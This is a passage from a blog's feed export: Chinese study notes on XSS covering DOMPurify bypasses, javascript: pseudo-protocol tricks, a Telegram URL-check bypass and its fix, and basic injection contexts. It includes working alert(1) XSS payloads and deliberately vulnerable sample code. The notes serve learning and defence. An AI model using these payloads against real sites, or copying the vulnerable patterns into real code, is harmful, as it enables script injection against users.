class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;srcdoc&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt></p><h3 id="xhtml和html"><a href="#xhtml和html" class="headerlink" title="xhtml和html"></a>xhtml和html</h3><p>在style标签底下的尖括号都不会被DOMPurify给过滤<br>这是一个挺重要的特性，在之前DOMPurify变体中就会造成绕过，在html和xhtml的解析标准不同下，也会造成绕过的漏洞<br>还有一个特点就是，在属性中的内容也不会被转义<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;]]&gt;&lt;/style&gt;&lt;script&gt;&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在html中这段看似没问题，DOMPurify也不会对他进行过滤<br>但是在xhtml中，CDATA那段就会被视为注释<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>最后就会解析成这种样子</p><h2 id="错误的使用这些库的方式"><a href="#错误的使用这些库的方式" class="headerlink" title="错误的使用这些库的方式"></a>错误的使用这些库的方式</h2><p>这里因为没有亲身经历过，也没办法复现，还是去看huli大佬的博客吧</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇主要讲讲xss的绕过和防御&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10315367&quot;&gt;https://ithelp.ithome.com.tw/articles/10315367&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全3-js伪协议（笔记）</title>
    <link href="http://example.com/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-23T10:51:56.000Z</published>
    <updated>2023-09-23T16:24:12.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前一直以为经过htmlspecialchars之后就不存在xss漏洞了，现在想来还是我太肤浅了</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10315118">https://ithelp.ithome.com.tw/articles/10315118</a><span id="more"></span><h2 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h2>可以触发的标签<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">f2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">form</span>=<span class="string">f2</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(2)</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>这种一般都是容易被忽略的注入xss的点，看到下面的代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$data</span>) ?&gt;&quot;</span>&gt;link&lt;/a&gt;`</span><br></pre></td></tr></table></figure>虽然他被html编码了，但是仍然可以用伪协议去触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></li></ul><p>当然，<code>window.location</code>也是可以触发伪协议的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;javascript:alert(1)&#x27;</span></span><br></pre></td></tr></table></figure></p><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>上面已经提到过了，html编码是行不通的，直接删掉javascript，攻击者就可以通过下面的代码进行绕过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&amp;#106avascript:alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>所以一般是通过白名单的方式，验证他的开头是否是http或者https这样<br>在tg中就出现过这样的问题<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">includes</span>(<span class="string">&#x27;://&#x27;</span>) ? url : <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>他并没有判断开头是否是<code>http://</code>或者是<code>https://</code>，所以导致攻击者可以用下面的代码进行绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;://&#x27;</span>)</span><br></pre></td></tr></table></figure><br>但是要在服务器也会判断上面的代码是否合规，那上面的代码显然不行，不过攻击者用了一种特殊写法绕过了。<br>URL的完全体一般是长下面的样子的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://username:password@www.example.com/</span><br></pre></td></tr></table></figure><br>所以构造绕过payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;Slonser was here!&#x27;</span>);<span class="comment">//@github.com</span></span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;Slonser was here!&#x27;);//@github.com&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就能弹窗了<br>tg的修复方式如下<br><a href="https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44">https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// HTTP was chosen by default as a fix for https://bugs.telegram.org/c/10712.</span></span><br><span class="line">  <span class="comment">// It is also the default protocol in the official TDesktop client.</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">    <span class="comment">// eslint-disable-next-line no-script-url</span></span><br><span class="line">    <span class="keyword">if</span> (parsedUrl.<span class="property">protocol</span> === <span class="string">&#x27;javascript:&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>利用URL去解析url，并提取出protocol，并判断</p><h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><p>一般来说加个<code>target=&quot;_blank&quot;</code>，就可以解决上面的问题<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://kaikaix.github.io&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在chrome中，点开上面的会先新建一个about:blank，然后在打开博客<br>在firefox中，会先新建一个空页面，在打开博客<br>但是所有都是先新建一个空页面，再去操作<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是如上的情况就只会新建一个页面，然后不会有其他的操作<br>但是这只是用鼠标左键的情况<br>当你用鼠标中键，也就是按一下那个滚轮，或者你用ctrl加左键，同样可以触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p><h2 id="题外话-innerHTML和innerText"><a href="#题外话-innerHTML和innerText" class="headerlink" title="题外话 innerHTML和innerText"></a>题外话 innerHTML和innerText</h2><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>现在有一个test.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;可控，但是无法绕过引号&#x27;</span></span><br></pre></td></tr></table></figure><br>另一个页面加载了该js<br>这时候应该怎么去执行xss<br>如果是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>是无法执行的，innerHTML禁止了script标签<br>这时候可以用img标签onerror属性去绕过<br>也可以用iframe标签的srcdoc去绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="comment">//当然下面这种也是可以的</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>属性中的内容是可以经过编码的<br>之前sekaictf拿到golf jail我就以为有了编码就不可能存在xss了</p><h3 id="innerText"><a href="#innerText" class="headerlink" title="innerText"></a>innerText</h3><p>接下来看看innerText<br>还是一样的代码，只不过改成innerText<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerText</span> = <span class="string">&#x27;&lt;iframe&lt;?php echo ($_GET[&#x27;</span>name<span class="string">&#x27;]) ?&gt;&gt;&lt;/iframe&gt;&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>可以看到他将你输入的尖括号之类的特殊字符都进行了html编码，那么就不会在存在xss漏洞了<br>但是有一点比较奇怪，当你从innerText中取东西，比如下面的代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>虽然<code>&lt;a&gt;</code>中的内容经过了编码，但是显示却是下面的内容<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>所以就会有一种情况，当年输入的内容被编码了，但是如果有以下的代码，就有可能会被绕过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerHTML</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>为什么不用<code>&lt;script&gt;</code>标签，上面提过innerHTML是不会去执行script标签下的代码的</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;以前一直以为经过htmlspecialchars之后就不存在xss漏洞了，现在想来还是我太肤浅了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10315118&quot;&gt;https://ithelp.ithome.com.tw/articles/10315118&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全2-基础xss（笔记）</title>
    <link href="http://example.com/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A82-%E5%9F%BA%E7%A1%80xss%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-20T09:18:25.000Z</published>
    <updated>2023-09-23T16:23:56.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊一下基础的xss，等着huli大佬写奇淫技巧</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10314883">https://ithelp.ithome.com.tw/articles/10314883</a><span id="more"></span></li></ul><h2 id="触发js代码"><a href="#触发js代码" class="headerlink" title="触发js代码"></a>触发js代码</h2><p>一般来说是用script标签去触发的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>但是除了script标签，还可以用inline event handler来进行触发<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;not_exist&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml">&lt;svg/onload=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>常见的用来触发event handler的有</p><ul><li>onerror</li><li>onload</li><li>onfocus</li><li>onblur</li><li>onanimationend</li><li>onclick</li><li>onmouseenter</li></ul><p>等等</p><p>当然还可以用伪协议去触发js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure><br>这里有个值得注意的点，可以把href后面的伪协议当做字符串，这时候如果用了html编码也可以触发js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&amp;#x6a;<span class="attr">avascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;<span class="title class_">Link</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>在这个网站有更多的payload<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p><h2 id="不同的xss"><a href="#不同的xss" class="headerlink" title="不同的xss"></a>不同的xss</h2><h3 id="注入html"><a href="#注入html" class="headerlink" title="注入html"></a>注入html</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Hello, &lt;h1&gt;&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种就直接htmlspecialchar就可以过滤了，比较常见不多赘述了</p><h3 id="注入属性"><a href="#注入属性" class="headerlink" title="注入属性"></a>注入属性</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> clazz = qs.<span class="title function_">get</span>(<span class="string">&#x27;clazz&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#content&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;div class=&quot;<span class="subst">$&#123;clazz&#125;</span>&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">      Demo</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">    &lt;/div&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml">  `</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这段代码会获取get参数的clazz，并拼接到<code>&lt;div class=&quot;&quot;&gt;</code>中</p><p>那么注入xss的方式有几种</p><p>第一种闭合div，增加一个标签<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;img src=not_exist onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure><br>那么代码就会变为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">not_exist</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span></span><br><span class="line"><span class="language-xml">  Demo</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>第二种闭合”然后增加属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; tabindex=1 onfocus=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&quot; x=&quot;</span></span><br></pre></td></tr></table></figure><br>那么就会变成<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;&quot;</span> tabindex=<span class="number">1</span> onfocus=<span class="string">&quot;alert(1)&quot;</span> x=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">Demo</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><h3 id="注入到js中"><a href="#注入到js中" class="headerlink" title="注入到js中"></a>注入到js中</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = `<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="meta">?&gt;</span>`;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当代码是这样的时候<br><code>?name=$&#123;alert(1)&#125;</code>可以用这种语句去注入js</p><p>如果是用双引号的形式，如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 